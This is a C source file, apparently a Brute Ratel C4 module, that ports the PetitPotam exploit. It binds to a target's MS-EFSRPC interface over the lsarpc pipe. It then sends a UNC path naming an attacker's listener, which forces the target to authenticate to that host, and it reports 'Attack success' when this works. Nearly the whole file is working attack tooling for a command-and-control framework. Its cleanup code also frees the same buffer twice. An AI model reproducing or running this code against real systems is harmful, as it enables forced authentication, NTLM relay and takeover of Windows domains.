#include <windows.h>

#if defined(WOW64)
#include "ms-efsrpc_c_x86.h"
#else
#include "ms-efsrpc_c.h"
#endif

#include "definitions.h"
#include "badger_exports.h"

#define BUF_SIZE 512
INT iGarbage = 1;
LPSTREAM lpStream = (LPSTREAM)1;

EXTERN_C void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(MSVCRT$malloc(len));
}

EXTERN_C void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	MSVCRT$free(ptr);
}

long EfsRpcOpenFileRaw(
	/* [in] */ handle_t binding_h,
	/* [out] */ PEXIMPORT_CONTEXT_HANDLE *hContext,
	/* [string][in] */ wchar_t *FileName,
	/* [in] */ long Flags)
{

	CLIENT_CALL_RETURN _RetVal;
	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;

	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
		{
		sizeof(RPC_CLIENT_INTERFACE),
		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
		0,
		0,
		0,
		0,
		0,
		0x00000001
		};

	const MIDL_STUB_DESC efsrpc_StubDesc = 
		{
		(void *)& efsrpc___RpcClientInterface,
		MIDL_user_allocate,
		MIDL_user_free,
		&efsrpc__MIDL_AutoBindHandle,
		0,
		0,
		0,
		0,
		ms2Defsrpc__MIDL_TypeFormatString.Format,
		1, /* -error bounds_check flag */
		0x50002, /* Ndr library version */
		0,
		0x801026e, /* MIDL Version 8.1.622 */
		0,
		0,
		0,  /* notify & notify_flag routine table */
		0x1, /* MIDL flag */
		0, /* cs routines */
		0,   /* proxy/server info */
		0
		};

#if defined(WOW64)
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[0],
		(unsigned char*)&binding_h);
#else
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[0],
		binding_h,
		hContext,
		FileName,
		Flags);
#endif

	return (long)_RetVal.Simple;
}

DWORD EfsRpcQueryRecoveryAgents(
	/* [in] */ handle_t binding_h,
	/* [string][in] */ wchar_t *FileName,
	/* [out] */ ENCRYPTION_CERTIFICATE_HASH_LIST **RecoveryAgents)
{

	CLIENT_CALL_RETURN _RetVal;
	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;

	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
		{
		sizeof(RPC_CLIENT_INTERFACE),
		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
		0,
		0,
		0,
		0,
		0,
		0x00000001
		};

	const MIDL_STUB_DESC efsrpc_StubDesc = 
		{
		(void *)& efsrpc___RpcClientInterface,
		MIDL_user_allocate,
		MIDL_user_free,
		&efsrpc__MIDL_AutoBindHandle,
		0,
		0,
		0,
		0,
		ms2Defsrpc__MIDL_TypeFormatString.Format,
		1, /* -error bounds_check flag */
		0x50002, /* Ndr library version */
		0,
		0x801026e, /* MIDL Version 8.1.622 */
		0,
		0,
		0,  /* notify & notify_flag routine table */
		0x1, /* MIDL flag */
		0, /* cs routines */
		0,   /* proxy/server info */
		0
		};

#if defined(WOW64)
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[316],
		(unsigned char*)&binding_h);
#else
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[330],
		binding_h,
		FileName,
		RecoveryAgents);
#endif

	return (DWORD)_RetVal.Simple;
}

RPC_STATUS CreateBindingHandle(_In_ LPWSTR lpwTarget, _Out_ RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;
	SEC_WINNT_AUTH_IDENTITY AuthIdentity = { 0 };

	StringBinding = 0;
	Binding = 0;

	rStatus = RPCRT4$RpcStringBindingComposeW((RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpwTarget, (RPC_WSTR)L"\\pipe\\lsarpc", (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RPCRT4$RpcBindingFromStringBindingW(StringBinding, &Binding);
		if (!rStatus) {
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			rStatus = RPCRT4$RpcBindingSetAuthInfoExW(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (rStatus == RPC_S_OK) {
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				BadgerDispatch(g_dispatch, "[+] RPC Binding successful.\n");
			}
		}
	}
	if (Binding) {
		RPCRT4$RpcBindingFree(&Binding);
	}

	if (StringBinding) {
		RPCRT4$RpcStringFreeW(&StringBinding);
	}

	return rStatus;
}

LPWSTR ConvertToWideChar(const char* input) {
	if (!input) {
		BadgerDispatch(g_dispatch, "[-] Null input string\n");
		return NULL;
	}

	int size = KERNEL32$MultiByteToWideChar(CP_ACP, 0, input, -1, NULL, 0);
	if (size == 0) {
		return NULL;
	}

	LPWSTR wideStr = (LPWSTR)BadgerAlloc(size * sizeof(WCHAR));
	if (!wideStr) {
		return NULL;
	}

	if (KERNEL32$MultiByteToWideChar(CP_ACP, 0, input, -1, wideStr, size) == 0) {
		BadgerFree((PVOID *)&wideStr);
		return NULL;
	}

	return wideStr;
}


void coffee( char ** argv, int argc, WCHAR** dispatch) {
	g_dispatch = dispatch;

	HRESULT hr = S_OK;
	CLIENT_CALL_RETURN _RetVal;
	LPWSTR lpwListener = NULL;
	LPWSTR lpwTarget = NULL;
	WCHAR wcRPCTarget[BUF_SIZE] = L"\\\\";
	WCHAR wcFileName[BUF_SIZE] = { 0 };
	LONG lFlag = 0;
	int size = 0;

	RPC_BINDING_HANDLE bHandle;
	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;
	PEXIMPORT_CONTEXT_HANDLE pContextHandle = NULL;
	ENCRYPTION_CERTIFICATE_HASH_LIST* pEncCertHashList = NULL;

	if(argc < 2){
		BadgerDispatch(g_dispatch, "[-] Usage: petitpotam.o <listener> <target>\n");
        return;
	}

	lpwListener = ConvertToWideChar(argv[0]);
    if (!lpwListener) {
		BadgerDispatch(g_dispatch, "[-] Could not convert listener to wchar\n");
        goto cleanup;
    }

	lpwTarget = ConvertToWideChar(argv[1]);
    if(!lpwTarget) {
		BadgerDispatch(g_dispatch, "[-] Could not convert target to wchar\n");
        goto cleanup;
    }

	BadgerDispatch(g_dispatch, "[>] PetitPotam exploit by Cneelis @Outflank\n");
	BadgerDispatch(g_dispatch, "[>] Based on original code by @topotam77\n");
	BadgerDispatch(g_dispatch, "[>] Ported to BRC4 by @rtecCyberSec\n\n");

	MSVCRT$wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);
	rStatus = CreateBindingHandle(wcRPCTarget, &bHandle);
	if (rStatus != RPC_S_OK) {
		BadgerDispatch(dispatch, "[-] RPC Binding failed...\n");
		return;
	}

	MSVCRT$swprintf_s(wcFileName, _countof(wcFileName), L"\\\\%ls\\C$\\Windows\\Temp\\blaTemp.tmp", lpwListener);

	hr = EfsRpcOpenFileRaw(bHandle, &pContextHandle, wcFileName, lFlag);
	if (hr != ERROR_BAD_NETPATH) {
		hr = EfsRpcQueryRecoveryAgents(bHandle, wcFileName, &pEncCertHashList);
	}

	if (hr != ERROR_BAD_NETPATH) {
		BadgerDispatch(g_dispatch, "[-] Attack Failed, %ld\n", hr);
	}
	else{
		BadgerDispatch(g_dispatch, "[+] Attack success!!!\n");
	}

cleanup:
	if(lpwListener) BadgerFree((PVOID *)&lpwListener);
	if(lpwTarget) BadgerFree((PVOID *)&lpwListener);

	return;
}
